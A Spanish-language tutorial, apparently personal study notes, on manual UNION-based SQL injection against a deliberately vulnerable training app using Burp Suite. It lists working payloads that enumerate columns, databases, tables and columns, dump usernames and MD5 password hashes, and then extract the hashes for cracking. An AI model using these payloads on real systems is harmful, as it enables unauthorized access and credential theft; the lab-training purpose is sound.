
---------
Las explotaciones manuales son aquellas realizadas a través de las capacidades manuales del atacante y que no derivan del uso de un script. Para practicar, existe el siguiente repositorio de GitHub que contiene ejercicios de inyección SQL:

[https://github.com/appsecco/sqlinjection-training-app](https://github.com/appsecco/sqlinjection-training-app)

Para acceder, el usuario y la contraseña son `admin` y `admin`. Puedes comprobar la vulnerabilidad ingresando una comilla (`'`) en la búsqueda de productos, lo cual puede romper la consulta y permitir la concatenación de otros comandos de inyección SQL.

En la explotación manual, se utiliza Burp Suite en la pestaña de Repeater. Primero, envía la petición a esta pestaña y luego selecciona "Send" y "Render". Además, en el Repeater, aparte del botón "Send", puedes utilizar `CTRL+SPACE` para enviar la petición más fácilmente.

Para enumerar cuántas columnas están operativas, ejecuta la siguiente cadena, variando el número de columnas hasta que no te aparezca un error. Esto te permitirá identificar las columnas operativas. Algunos ejemplos de explotaciones manuales usando [[SQLI]] son: 

```bash
searchitem=test' order by 5-- -
```

Luego, editando el comando a:

```bash
searchitem=test' union select 1,2,3,4,5-- -
```

Podemos ver que la inyección de código ahora nos muestra esos números. Posteriormente, para saber en qué base de datos estamos, lo hacemos con:

```bash
searchitem=test' union select 1,2,database(),4,5-- -
```

Posteriormente, si queremos saber el usuario al que le pertenece esa base de datos, lo hacemos con:

```bash
searchitem=test' union select 1,2,user(),4,5-- -
```

Ahora, si queremos ver todas las bases de datos disponibles, lo hacemos con:

```bash
searchitem=test' union select 1,2,schema_name,4,5 from information_schema.schemata-- -
```

Para ver las tablas que están disponibles en esa base de datos, hacemos lo siguiente:

```bash 
searchitem=test' union select 1,2,table_name,4,5 from information_schema.tables where table_schema='sqlitraining'-- -
```

Ahora, si queremos ver las columnas asociadas a esa tabla, lo que hacemos es lo siguiente:

```bash 
searchitem=test' union select 1,2,column_name,4,5 from information_schema.columns where table_schema='sqlitraining' and table_name='users'-- -
```

Posteriormente, si queremos ver los campos de usuario y contraseña, haremos lo siguiente:

```bash 
searchitem=test' union select 1,username,password,4,5 from users-- -
```

Si queremos concatenar para que sea más fácil copiar un solo hash en MD5, haremos lo siguiente:

```bash
searchitem=test' union select 1,2,group_concat(username,0x3a,password),4,5 from users-- -
```

En donde la parte de `0x3a` es la ejemplificación de los dos puntos (`:`) en hexadecimal, que es interpretado por la base de datos. Así, en el modo pretty de Burp Suite, podemos copiar la concatenación en un solo hash disponible.

Una vez copiadas las contraseñas en un archivo creado en `nvim`, en la terminal de comandos podemos aplicar una sustitución como:

```Nvim
%s/,\r/g
```

Donde la sustitución se aplica a la coma (`,`) por un retorno de carro (`\r`), y se le aplica a todo el archivo con la opción `/g`.

Ahora, con el siguiente comando, tomamos solo la parte de los hashes para después romperlos usando herramientas como hashes.com. Para extraer solo las contraseñas, ejecutamos el siguiente comando:

```bash 
cat contraseñas | awk '{print $2}' FS=":"
```

